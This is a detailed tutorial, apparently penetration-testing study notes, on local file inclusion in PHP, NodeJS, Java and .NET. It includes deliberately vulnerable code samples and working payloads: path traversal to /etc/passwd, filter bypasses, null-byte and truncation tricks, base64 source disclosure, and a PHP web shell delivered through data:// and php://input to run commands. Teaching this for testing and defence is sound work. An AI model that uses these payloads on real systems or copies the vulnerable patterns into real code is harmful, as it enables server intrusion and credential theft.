# File Inclusion Vulnerabilities — Complete Detailed Notes

---

## Table of Contents

1. [Intro to File Inclusions](#intro-to-file-inclusions)
2. [Local File Inclusion (LFI) — Overview & Concepts](#local-file-inclusion-lfi)
3. [Examples of Vulnerable Code](#examples-of-vulnerable-code)
   - [PHP](#php)
   - [NodeJS](#nodejs)
   - [Java](#java)
   - [.NET](#net)
   - [Read vs Execute](#read-vs-execute)
4. [Basic LFI — Exploitation](#basic-lfi--exploitation)
   - [Path Traversal](#path-traversal)
   - [Filename Prefix](#filename-prefix)
   - [Appended Extensions](#appended-extensions)
   - [Second-Order Attacks](#second-order-attacks)
5. [Basic Bypasses](#basic-bypasses)
   - [Non-Recursive Path Traversal Filters](#non-recursive-path-traversal-filters)
   - [Encoding](#encoding)
   - [Approved Paths](#approved-paths)
   - [Appended Extension Bypasses](#appended-extension-bypasses)
   - [Path Truncation](#path-truncation)
   - [Null Bytes](#null-bytes)
6. [PHP Filters](#php-filters)
   - [Input Filters](#input-filters)
   - [Fuzzing for PHP Files](#fuzzing-for-php-files)
   - [Standard PHP Inclusion](#standard-php-inclusion)
   - [Source Code Disclosure](#source-code-disclosure)
7. [PHP Wrappers](#php-wrappers)
   - [Data Wrapper](#data-wrapper)
   - [Input Wrapper](#input-wrapper)
   - [Expect Wrapper](#expect-wrapper)
8. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
   - [Local vs Remote File Inclusion](#local-vs-remote-file-inclusion)
   - [Verify RFI](#verify-rfi)
   - [Remote Code Execution with RFI](#remote-code-execution-with-rfi)
   - [HTTP](#http)
   - [FTP](#ftp)
   - [SMB](#smb)
9. [LFI and File Uploads](#lfi-and-file-uploads)
   - [Image Upload](#image-upload)
   - [Crafting Malicious Image](#crafting-malicious-image)
   - [Uploaded File Path](#uploaded-file-path)
   - [Zip Upload](#zip-upload)
   - [Phar Upload](#phar-upload)
10. [Log Poisoning](#log-poisoning)
    - [PHP Session Poisoning](#php-session-poisoning)
    - [Server Log Poisoning](#server-log-poisoning)
11. [Automated Scanning](#automated-scanning)
    - [Fuzzing Parameters](#fuzzing-parameters)
    - [LFI Wordlists](#lfi-wordlists)
    - [Fuzzing Server Files](#fuzzing-server-files)
    - [Server Webroot](#server-webroot)
    - [Server Logs/Configurations](#server-logsconfigurations)
    - [LFI Tools](#lfi-tools)

---

## Intro to File Inclusions

Many modern back-end languages, such as PHP, JavaScript, or Java, use HTTP parameters to specify what is shown on the web page. This approach allows developers to build dynamic web pages, reduce script size, and simplify code by reusing static templates (headers, footers, navbars) while pulling in dynamic content. These parameters tell the server which resource or file to load and display to the user.

When these functionalities are not securely coded — meaning when user-supplied input is directly passed into file-loading functions without proper validation or sanitization — an attacker can manipulate those parameters to load any file from the server's file system. This leads to what is known as a **Local File Inclusion (LFI)** vulnerability, one of the most dangerous and commonly exploited web vulnerabilities.

File inclusion vulnerabilities exist across many server-side languages including PHP, NodeJS, Java, and .NET. Each language has its own file-loading functions and mechanisms, but all share the same fundamental weakness: trusting user-controlled input to specify file paths. Understanding this class of vulnerability is foundational to web application penetration testing.

The impact of File Inclusion can range from information disclosure (reading config files, passwords, source code) to complete server compromise through Remote Code Execution (RCE). Attackers who can read source code can identify further vulnerabilities, extract database credentials, and gain persistent access to the system.

---

## Local File Inclusion (LFI)

### What is LFI?

Local File Inclusion (LFI) is a vulnerability where an attacker can force a web application to include and display files from the server's local file system that were not intended to be accessible. It most commonly arises in **templating engines**, where the application dynamically loads parts of the page (e.g., language files, partial views) based on a parameter in the URL.

A classic example URL pattern looks like:

```
/index.php?page=about
```

Here, `index.php` handles the static parts (header/footer), and the `page` parameter tells it which content file to load — in this case, `about.php`. If an attacker can change `page` to a path of their choice, they can trick the server into serving sensitive files.

### Why Is LFI Dangerous?

LFI vulnerabilities can lead to three major security impacts:

**1. Source Code Disclosure** — Attackers can read PHP or other server-side files and understand the application logic, find other bugs, and find hardcoded secrets.

**2. Sensitive Data Exposure** — Files like `/etc/passwd`, database configuration files, SSH keys, and `.env` files can be read, giving the attacker credentials or fingerprinting information.

**3. Remote Code Execution (RCE)** — Under certain conditions (writable logs, file uploads, PHP wrappers), LFI can be escalated to full RCE, completely compromising the server and any connected systems.

---

## Examples of Vulnerable Code

File Inclusion vulnerabilities occur in many popular web servers and development frameworks. The root cause is always the same: user input is passed directly into a file-loading function without validation. Below are examples in different languages showing exactly how this happens and why it is dangerous.

---

### PHP

PHP is the most common server-side language where LFI vulnerabilities are found. The `include()` function in PHP is used to load and execute another PHP file. When the path passed to `include()` comes from a user-controlled GET parameter, the entire vulnerability is exposed.

**Vulnerable PHP Code Example:**

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

**How this works:**
- The `$_GET['language']` value comes directly from the URL, e.g., `?language=es.php`
- This value is passed directly into `include()` with zero filtering
- An attacker can replace `es.php` with `/etc/passwd` or any other file path
- The server will load and include that file's contents in the response

**Other Vulnerable PHP Functions (same issue applies to all of these):**

| Function | Description |
|---|---|
| `include()` | Loads and executes a file; throws a warning if file not found |
| `include_once()` | Same as `include()` but only includes the file once |
| `require()` | Loads and executes a file; throws a fatal error if file not found |
| `require_once()` | Same as `require()` but only includes the file once |
| `file_get_contents()` | Reads the content of a file and returns it as a string |
| `fopen()` | Opens a file or URL for reading/writing |
| `file()` | Reads a file into an array, one element per line |

All of the above functions become vulnerable when a user-controlled value is passed as the file path argument without sanitization. The key difference among them is whether they also **execute** code or just **read** content, which matters when trying to achieve RCE.

---

### NodeJS

NodeJS web servers can also be vulnerable to file inclusion attacks. The Node.js `fs.readFile()` function reads the contents of a file and writes it to the HTTP response. If the file path comes from the URL query string, the same LFI issue exists.

**Vulnerable NodeJS Code Example (using `fs.readFile`):**

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

**How this works:**
- `req.query.language` reads the `?language=` GET parameter from the URL
- `path.join(__dirname, req.query.language)` builds a file path using the user-supplied value
- `fs.readFile()` reads that file and writes its content to the response
- An attacker can supply `../../../../etc/passwd` as the language parameter to read system files

**Vulnerable NodeJS Code Example (using `res.render` in Express.js):**

```javascript
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

**How this works:**
- The language is taken from the URL path itself (e.g., `/about/en` or `/about/es`)
- The `res.render()` function uses the language value directly in the file path template
- An attacker can navigate to `/about/../../../etc` to traverse the path
- Unlike query parameters (after `?`), this version uses **path parameters** (part of the route itself)

---

### Java

Java-based web applications using JSP (JavaServer Pages) can also be vulnerable. The `<jsp:include>` tag is used to include another file or URL in the current page. When the file path is pulled directly from the request parameter, it is vulnerable.

**Vulnerable Java Code Example (using `jsp:include`):**

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

**How this works:**
- `request.getParameter('language')` retrieves the user-supplied `language` parameter from the HTTP request
- This value is passed directly to `<jsp:include file="...">` which includes and renders the specified file
- An attacker can supply a malicious file path to read files from the server

**Vulnerable Java Code Example (using `c:import`):**

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

**How this works:**
- `<c:import>` is more powerful than `<jsp:include>` — it can import both local files and remote URLs
- If user input controls the `url` attribute, the attacker can include remote content (leading to RFI)
- This makes `<c:import>` particularly dangerous because it supports remote URL inclusion

---

### .NET

.NET web applications (C#, ASP.NET) also have several functions that can lead to File Inclusion vulnerabilities. The most common ones are `Response.WriteFile()`, `@Html.Partial()`, and the `include` directive.

**Vulnerable .NET Code Example (using `Response.WriteFile`):**

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

**How this works:**
- `HttpContext.Request.Query['language']` gets the `language` query parameter from the URL
- The value is passed to `Response.WriteFile()` which reads a file and writes it to the HTTP response
- This only reads the file — it does not execute code — but can still expose sensitive files

**Vulnerable .NET Code Example (using `@Html.Partial`):**

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

**How this works:**
- `@Html.Partial()` renders a partial view (a reusable HTML template fragment) by file name
- The user-controlled language parameter is passed as the view name/path
- An attacker can specify a path to read other files on the server

**Vulnerable .NET Code Example (using `include` directive):**

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

**How this works:**
- This is a Server-Side Include (SSI) directive that tells the web server to include and execute the specified file
- The file path is taken from the user-supplied `language` parameter
- This version can **execute** code — making it the most dangerous of the three .NET examples

---

### Read vs Execute

One of the most important distinctions when analyzing File Inclusion vulnerabilities is whether the vulnerable function only **reads** the file content or also **executes** it as code. Functions that execute code can lead to Remote Code Execution (RCE). Functions that only read content are still dangerous (source code disclosure, credential leakage) but cannot directly execute commands.

Additionally, some functions allow **remote URLs** to be specified (leading to Remote File Inclusion, RFI), while others are restricted to local files only.

**Complete Function Capability Table:**

| Function | Read Content | Execute | Remote URL |
|---|---|---|---|
| **PHP** | | | |
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |
| **NodeJS** | | | |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** | | | |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | | | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |

This table is critical to keep in mind during web application testing. If a vulnerable function can execute code (marked ✅ under "Execute"), then finding an LFI becomes a pathway to RCE. If the function only reads, you can still exfiltrate source code, credentials, and other sensitive data — which may lead to further exploitation through other means.

Even read-only LFI is considered critical, because leaked source code can reveal:
- Database credentials
- Admin passwords
- API keys
- Other vulnerabilities (SQLi, SSRF, etc.)

---

## Basic LFI — Exploitation

Now that we understand what File Inclusion vulnerabilities are and how they occur, we can start learning how to exploit them to read files from the back-end server.

### Basic LFI

The most straightforward form of LFI occurs when user input is directly passed to a file-loading function. Consider a web application where the URL looks like:

```
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```

The `language` parameter controls which content file is loaded. If the server is using something like `include($_GET['language'])`, we can change the parameter to any file path. Two common readable files on most back-end servers are:

- **Linux:** `/etc/passwd`
- **Windows:** `C:\Windows\boot.ini`

**Basic LFI Payload:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```

If the application is vulnerable and passes the parameter directly to `include()`, the contents of `/etc/passwd` (which lists all system users on Linux) will be displayed in the page response. This confirms an LFI vulnerability exists.

---

### Path Traversal

Path Traversal is a technique used when the server-side code **prepends or appends** a string to the user-supplied parameter, making direct absolute-path inclusion fail.

**Example of code with a prepended directory:**

```php
include("./languages/" . $_GET['language']);
```

In this case, if we try `?language=/etc/passwd`, the full path becomes:

```
./languages//etc/passwd
```

This path does not exist, so the inclusion fails. We need to use **path traversal** using `../` sequences to navigate up the directory tree to the root `/`.

**How `../` works:**
- `../` means "go up one directory level" (to the parent directory)
- If the web app is in `/var/www/html/languages/`, then `../` takes us to `/var/www/html/`
- Using `../` three times (`../../../`) takes us to `/` (the root)
- From root, we can then navigate to any file like `/etc/passwd`

**Path Traversal Payload:**

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

**How this works:**
- Each `../` moves up one directory level
- Four `../` sequences navigate from `./languages/` back to the root `/`
- Then `/etc/passwd` is appended to reach the target file
- The final resolved path becomes `/etc/passwd`

**Pro Tip:** If you are unsure how deep the directory is, you can use many `../` sequences (even 10 or 20). On Linux/Unix systems, using `../` when already at `/` simply stays at `/`, so it never breaks the path. For a path like `/var/www/html/`, you need exactly 3 `../` sequences to reach root.

```bash
# Calculate: /var/www/html/ is 3 directories deep from root
# So use exactly 3 times: ../../../
../../../etc/passwd
```

---

### Filename Prefix

Sometimes the application prepends a **prefix string** (not just a directory) to our input — for example, adding `lang_` before the value:

**Vulnerable PHP Code:**

```php
include("lang_" . $_GET['language']);
```

**What happens with path traversal:**

If we try `?language=../../../etc/passwd`, the resulting string is:

```
lang_../../../etc/passwd
```

This is an invalid path — there is no file/directory named `lang_../../../etc/passwd`. The inclusion fails.

**Bypass using a leading `/`:**

We can prefix our payload with a forward slash `/` to treat the prefix as a directory name:

```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

**How this works:**
- The full string becomes `lang_/../../../etc/passwd`
- The `lang_/` is treated as a (non-existent) directory name
- The `../` sequences navigate above it and eventually reach the root
- From root, `/etc/passwd` is accessible

**Important Note:** This technique may not always work. If the prefix causes the relative path to point to a non-existent starting directory, the traversal may fail. Additionally, this technique may break other LFI methods like PHP wrappers and filters discussed in later sections.

---

### Appended Extensions

Another common protection is when the application **automatically appends a file extension** to the user-supplied parameter:

**Vulnerable PHP Code:**

```php
include($_GET['language'] . ".php");
```

This means:
- If we supply `es`, the file loaded is `es.php` — intended behavior
- If we supply `/etc/passwd`, the file loaded is `/etc/passwd.php` — this file does not exist

**Example URL:**

```
http://<SERVER_IP>:<PORT>/extension/index.php?language=/etc/passwd
```

The server tries to include `/etc/passwd.php` which does not exist, so the inclusion fails. This protection exists to restrict inclusion to only PHP files. There are techniques to bypass this (Path Truncation and Null Bytes — covered in the Basic Bypasses section).

**Exercise:** Try to read any PHP file (e.g., `index.php`) through LFI and observe whether you get the source code or whether the file is rendered as HTML.

---

### Second-Order Attacks

A **Second-Order LFI Attack** is a more advanced and subtle variant. It occurs when a web application stores user-supplied data (like a username) in a database, and then later uses that stored value to load a file — without properly sanitizing the stored value at the time of use.

**Attack scenario:**

1. A web application allows users to set their username during registration
2. The application later uses the username to load a user-specific file, like:
   ```
   /profile/$username/avatar.png
   ```
3. An attacker registers with a malicious username like:
   ```
   ../../../etc/passwd
   ```
4. When the application tries to load the avatar for that user, it constructs the path:
   ```
   /profile/../../../etc/passwd/avatar.png
   ```
   or simply includes the username in a file path, leading to LFI

**Why this is tricky:**
- Developers often properly filter direct user input (e.g., the `?page=` parameter)
- But they may trust values that come from their own database (like the stored username)
- The attacker poisons the database entry, and the LFI is triggered by a completely different part of the application

**Key Point:** Exploiting Second-Order LFI is technically the same as regular LFI — the difference is the attack surface. You must identify which application functionality uses database-stored values to load files, and then control those stored values to inject your malicious path.

---

## Basic Bypasses

In many cases, web applications apply filters and protections against file inclusion attacks. However, unless the web application is properly secured, these protections can often be bypassed using various techniques.

---

### Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a **search-and-replace filter** that removes `../` substrings from the user input.

**Vulnerable PHP Code with Filter:**

```php
$language = str_replace('../', '', $_GET['language']);
```

**How this filter works:**
- The PHP function `str_replace('../', '', $input)` finds all occurrences of `../` in the input string and replaces them with nothing (empty string)
- So if we supply `../../../../etc/passwd`, the filter removes all `../` sequences
- The result becomes `etc/passwd`, and the full path becomes `./languages/etc/passwd`
- That file doesn't exist, so the inclusion fails

**Why this filter is insecure (non-recursive):**
- The filter only runs **once** on the input — it does not re-check the output after replacing
- If we embed `../` inside another `../` pattern, after one pass of replacement, a valid `../` remains

**Bypass Payload — using `....//`:**

```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

**How this bypass works step by step:**
1. Input supplied: `....//....//....//....//etc/passwd`
2. The filter looks for `../` — it finds it inside `....//` (specifically the `../` in the middle)
3. After removing `../` from `....//`, the result is `../` (because `..` + empty + `/` = `../`)
4. So `....//` → after filter → `../`
5. Four `....//` patterns become four `../` sequences after filtering
6. Final path traversal works normally to reach `/etc/passwd`

**Other bypass variations:**

```
..././        (becomes ../ after filter removes ./)
....\/        (uses backslash to embed the ../ pattern)
....////      (extra slashes)
```

All of these embed the `../` pattern in a way that survives the non-recursive filter.

---

### Encoding

Some web application filters block specific **characters** used in path traversal, such as `.` (dot) and `/` (forward slash). However, these character-level filters can often be bypassed using **URL encoding**, where special characters are represented as their hexadecimal equivalents.

**URL Encoding of `../`:**

| Character | URL Encoded |
|---|---|
| `.` (dot) | `%2e` |
| `/` (slash) | `%2f` |
| `../` (full) | `%2e%2e%2f` |

**URL Encoded Payload:**

```
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

**How this works:**
- The filter checks the raw input for `.` and `/` characters
- Because we've URL-encoded them as `%2e` and `%2f`, the filter does not detect them
- However, when the web server passes the value to the PHP function, it **URL-decodes** the string first
- The function then receives the decoded `../../../../etc/passwd` path and includes the file

**Important Note:** When URL encoding, **ALL characters must be encoded**, including the dots. Some online URL encoders skip dots because they are normally allowed in URLs. Use tools like **Burp Suite Decoder** to properly encode all characters including dots.

**Double Encoding:**
We can also double-encode the string (URL encode the already-encoded string once more). This bypasses filters that decode once and then check:

```
%25 2e%252e%252f  → decoded once → %2e%2e%2f → decoded again → ../
```

---

### Approved Paths

Some web applications use **Regular Expressions (regex)** to ensure that the file path being included starts with an approved directory (e.g., must start with `./languages/`).

**Vulnerable PHP Code with Approved Path Filter:**

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

**How this filter works:**
- `preg_match('/^\.\/languages\/.+$/', ...)` uses a regex that checks if the input starts with `./languages/` and has at least one character after it
- If the input does not start with `./languages/`, it is rejected
- A direct payload like `/etc/passwd` would fail because it doesn't start with `./languages/`

**Bypass — start with the approved path, then traverse:**

```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

**How this works:**
- The input starts with `./languages/` — which satisfies the regex check
- After the approved prefix, we use `../../../../` to traverse back to the root
- From root, we navigate to `/etc/passwd`
- The regex only checks the beginning of the string, not the entire resolved path

**Finding the approved path:**
- Examine normal requests made by the application's forms/links (using Burp Suite or browser DevTools)
- Observe what path they use in the language parameter
- You can also fuzz directories under the same path to find additional approved ones

---

### Appended Extension Bypasses

When a web application appends `.php` (or another extension) to the user input, there are techniques to bypass this. The following two techniques work on **older versions of PHP** (before PHP 5.3/5.4) and are now largely obsolete on modern servers — but may still apply to legacy systems.

---

### Path Truncation

In PHP versions before 5.3/5.4, strings had a maximum length of **4096 characters** (due to 32-bit system limitations). Any characters beyond this limit were silently **truncated** (dropped). Additionally, PHP used to remove trailing slashes and single dots from path names.

**How Path Truncation works:**
- We craft an extremely long URL parameter (over 4096 characters)
- At the end of the path, we add the target file: `/etc/passwd`
- After `/etc/passwd`, we add hundreds of `./` characters to pad the string
- The `.php` extension gets appended after our string — but since the total length exceeds 4096 characters, the `.php` gets truncated (dropped)
- PHP then resolves the path without the `.php` extension, reading `/etc/passwd` as intended

**The payload structure:**

```
?language=non_existing_directory/../../../etc/passwd/./././././ [repeated ~2048 times]
```

**Why we need a non-existing directory at the start:**
- This technique requires the path to start with a non-existing directory
- This ensures the path traversal navigates correctly

**Command to generate the payload automatically:**

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**Command Breakdown:**
- `echo -n "non_existing_directory/../../../etc/passwd/"` — prints the base path without a newline (`-n` flag suppresses the newline)
- `&&` — chains the next command to run after the first succeeds
- `for i in {1..2048}; do echo -n "./"; done` — loops 2048 times, each time printing `./` (no newline)
- The result is the base path followed by 2048 repetitions of `./`, creating a string just over 4096 characters
- The `.php` extension appended by the server gets truncated off the end

**Important calculation:** The total string length must be exactly over 4096 characters so that `.php` (4 or 5 characters) is the part that gets cut off — not the actual file path at the end.

---

### Null Bytes

PHP versions before **5.5** were vulnerable to **Null Byte Injection**. In C and low-level languages, a null byte (`\0` or `%00`) marks the **end of a string**. PHP inherited this behavior from its C internals, meaning a null byte would terminate string processing even if PHP itself had more content after it.

**How Null Byte Injection works:**
- We append `%00` (the URL-encoded null byte) to the end of our file path
- PHP passes the string to the underlying C function for file access
- The C function reads until the null byte and stops — ignoring `.php` that comes after it
- The file is accessed without the `.php` extension

**Null Byte Payload:**

```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd%00
```

**How this resolves:**
1. PHP receives: `/etc/passwd%00`
2. The URL-decoded value is: `/etc/passwd\0`
3. The application appends `.php`: `/etc/passwd\0.php`
4. The underlying C file function reads up to the null byte: `/etc/passwd`
5. PHP opens and includes `/etc/passwd` — bypassing the `.php` extension requirement

**Note:** This technique only works on PHP < 5.5. Modern PHP versions have patched null byte injection by treating null bytes as invalid characters and rejecting them.

---

## PHP Filters

Many popular web applications are developed in PHP, and PHP provides a powerful feature called **PHP Wrappers** that allow access to different I/O streams (standard input/output, file descriptors, memory streams, etc.). While PHP developers use these wrappers legitimately, penetration testers can exploit them to extend LFI attacks — reading PHP source code files or even executing system commands.

This section covers **PHP Filters**, which can be used to read PHP source code by encoding it in base64. The next section covers PHP Wrappers for RCE.

---

### Input Filters

PHP Filters (accessed via the `php://filter/` wrapper) allow transforming stream data before it is processed. The general format for using PHP filters in an LFI attack is:

```
php://filter/read=<filter_name>/resource=<file_to_read>
```

**Key Parameters:**
- `resource=` — Specifies the file or stream to apply the filter to (required)
- `read=` — Specifies which filter to apply when reading the resource

**Types of PHP Filters available:**
1. **String Filters** — Manipulate string content (e.g., `string.toupper`, `string.tolower`)
2. **Conversion Filters** — Convert data format (e.g., `convert.base64-encode`, `convert.base64-decode`)
3. **Compression Filters** — Compress/decompress data (e.g., `zlib.deflate`, `zlib.inflate`)
4. **Encryption Filters** — Encrypt/decrypt data

**Most Important Filter for LFI:**
`convert.base64-encode` — This filter encodes the file content in base64 before returning it. This is crucial because:
- Including a PHP file normally causes PHP to **execute** it (not show source code)
- By base64 encoding it first, PHP encodes the file content into a safe string
- The encoded string is then returned in the response instead of being executed
- We can then decode the base64 string offline to get the original PHP source code

---

### Fuzzing for PHP Files

Before reading PHP source files, we first need to **discover which PHP files exist** on the server. We use a fuzzing tool like `ffuf` (Fuzz Faster U Fool) to enumerate PHP files by appending `.php` to wordlist entries and checking which ones return valid responses.

**Command:**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

**Command Breakdown:**
- `ffuf` — The fuzzing tool (fast web fuzzer written in Go)
- `-w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ` — Specifies the wordlist file and maps it to the `FUZZ` keyword. The wordlist contains common directory and file names.
- `-u http://<SERVER_IP>:<PORT>/FUZZ.php` — The URL to fuzz. `FUZZ` is replaced with each word from the wordlist, and `.php` is appended automatically
- Each request like `http://server/index.php`, `http://server/config.php`, `http://server/admin.php` is tested

**Example Output:**

```
index     [Status: 200, Size: 2652, Words: 690, Lines: 64]
config    [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**Important Tip:** Do not restrict fuzzing to only HTTP 200 responses. With LFI access, we may be able to read files that return 301, 302, or 403 responses as well. These files exist but may redirect or be restricted — yet we can still read their source via LFI.

Once PHP files are identified (like `config.php`, `admin.php`, etc.), we can read their source code using the base64 PHP filter technique described next.

---

### Standard PHP Inclusion

When we try to include a PHP file via LFI in the normal way (e.g., `?language=config`), PHP **executes** the included file rather than displaying its source code. If `config.php` only sets up configuration variables and doesn't output anything visible, we get a blank response.

**Example URL:**

```
http://<SERVER_IP>:<PORT>/index.php?language=config
```

The page appears empty because `config.php` runs silently — it sets database credentials and other config values but produces no HTML output. We cannot read its source this way.

This is where the **base64 PHP filter** becomes essential — it intercepts the file before execution and returns it in encoded form.

---

### Source Code Disclosure

To read PHP source code via LFI, we use the `convert.base64-encode` filter with the `php://filter` wrapper.

**Payload Structure:**

```
php://filter/read=convert.base64-encode/resource=config
```

**Full URL:**

```
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

**How this works:**
1. PHP receives the `php://filter/read=convert.base64-encode/resource=config` string
2. It recognizes the `php://filter` wrapper and applies the `convert.base64-encode` filter
3. The resource `config` (which becomes `config.php` after the auto-appended extension) is read
4. Instead of executing the PHP code, the filter encodes its raw content in base64
5. The encoded string is returned in the HTTP response — we see a long base64 string

**Note:** The `.php` extension is **not** added in our payload string because the web application automatically appends `.php` to our input. So `resource=config` becomes `config.php`.

**Decoding the base64 output:**

Once we see the base64-encoded string in the response, copy it and decode it in the terminal:

```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

**Command Breakdown:**
- `echo 'PD9waHAK...KICB9Ciov'` — Prints the base64 string (replace with actual encoded content from the response)
- `|` — Pipes the output of echo into the next command
- `base64 -d` — The `base64` command with the `-d` flag decodes the input from base64 to its original binary/text form

**Example decoded output:**

```php
if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}
```

This reveals the actual PHP source code of `config.php`, which may contain database credentials, admin passwords, API keys, and other sensitive information. This information can be used to:
- Log in directly to the database
- Access admin panels
- Find further vulnerabilities in the code
- Identify other files to read (by scanning the code for `include()` or `require()` calls)

**Tip:** When copying the base64 string from the page, view the page source (Ctrl+U in browser) to ensure you capture the full untruncated string — the rendered view may cut it off.

---

## PHP Wrappers

PHP Wrappers extend LFI exploitation beyond just reading files. In this section, we use PHP wrappers to achieve **Remote Code Execution (RCE)** directly through the LFI vulnerability without needing to rely on credential enumeration or local file privileges.

We will cover three main PHP wrappers for RCE: `data://`, `php://input`, and `expect://`.

---

### Data Wrapper

The `data://` PHP wrapper allows us to include **external data** — including raw PHP code — as if it were a file. When PHP processes this wrapper, it executes the included PHP code, giving us code execution.

**Critical Requirement:** The `allow_url_include` setting must be **enabled** in the PHP configuration (`php.ini`) for the `data://` wrapper to work. This setting is **disabled by default**, but many web applications (including some WordPress plugins) enable it.

#### Checking PHP Configurations

To check if `allow_url_include` is enabled, we read the PHP configuration file using LFI. The config file is typically located at:
- **Apache:** `/etc/php/X.Y/apache2/php.ini` (where X.Y is the PHP version, e.g., 7.4)
- **Nginx (PHP-FPM):** `/etc/php/X.Y/fpm/php.ini`

**Command to read PHP config file via cURL:**

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

**Command Breakdown:**
- `curl` — A command-line tool for making HTTP requests
- `"http://<SERVER_IP>:<PORT>/..."` — The target URL with the LFI payload
- `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini` — Uses the PHP filter wrapper to base64-encode the php.ini file (since .ini files have similar encoding needs as .php files)
- `../../../../` — Path traversal to navigate to the root from the web application directory

The response contains a large base64-encoded string representing the entire `php.ini` file.

**Command to decode and check `allow_url_include`:**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

**Command Breakdown:**
- `echo '...'` — Outputs the base64 string from the response
- `| base64 -d` — Decodes the base64 string back to plaintext (the full php.ini content)
- `| grep allow_url_include` — Searches the decoded output for the line containing `allow_url_include`

**Expected Output if enabled:**

```
allow_url_include = On
```

If the value is `On`, we can proceed with the `data://` wrapper attack.

#### Remote Code Execution (using data wrapper)

**Step 1 — Create a basic PHP web shell and base64 encode it:**

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

**Command Breakdown:**
- `echo '<?php system($_GET["cmd"]); ?>'` — Outputs a simple PHP one-liner web shell. This shell uses PHP's `system()` function to execute the OS command passed via the `cmd` GET parameter
- `| base64` — Pipes the output to the `base64` command, which encodes it to a base64 string

**Output:**

```
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

**Step 2 — Use the data wrapper with the base64 encoded shell:**

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**How this works:**
- `data://text/plain;base64,<encoded_shell>` — The `data://` wrapper includes inline data. The `text/plain;base64,` prefix tells PHP that the data is base64-encoded text
- PHP decodes the base64 string to get `<?php system($_GET["cmd"]); ?>`
- PHP then **executes** this as PHP code (because the `include()` function executes PHP)
- The `&cmd=id` appended to the URL passes `id` as the value of the `cmd` parameter
- PHP's `system('id')` runs the `id` command on the OS and outputs the result

**Note:** `%2B` is the URL-encoded `+` and `%3D` is the URL-encoded `=` — these special characters in base64 must be URL-encoded in the URL

**Using cURL instead of browser:**

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

**Command Breakdown:**
- `curl -s` — Makes an HTTP GET request silently (`-s` suppresses progress output)
- URL with the `data://` payload and `&cmd=id` — Executes the `id` command
- `| grep uid` — Filters the output to show only lines containing `uid` (the output of the `id` command)

**Expected Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms RCE as the `www-data` user (the web server user).

---

### Input Wrapper

The `php://input` wrapper is similar to the `data://` wrapper but works differently — instead of embedding the PHP code in the URL, we send it as the **POST request body**. This is useful when the URL length is restricted or when the `data://` scheme is blocked.

**Requirement:** The vulnerable parameter must accept POST requests, and `allow_url_include` must be enabled (same as with the `data://` wrapper).

**Command:**

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

